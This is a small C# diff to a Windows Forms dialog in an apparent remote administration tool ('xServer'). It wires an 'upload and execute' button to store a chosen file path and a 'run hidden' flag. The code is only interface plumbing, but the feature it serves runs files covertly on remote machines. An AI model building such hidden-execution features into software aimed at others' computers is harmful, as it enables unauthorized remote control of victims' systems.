@@ -55,6 +55,9 @@ namespace xServer.Forms
 
         private void btnUploadAndExecute_Click(object sender, EventArgs e)
         {
+            Core.Misc.UploadAndExecute.FilePath = File.Exists(txtPath.Text) ? txtPath.Text : string.Empty;
+            Core.Misc.UploadAndExecute.RunHidden = chkRunHidden.Checked;
+
             this.DialogResult = DialogResult.OK;
             this.Close();
         }
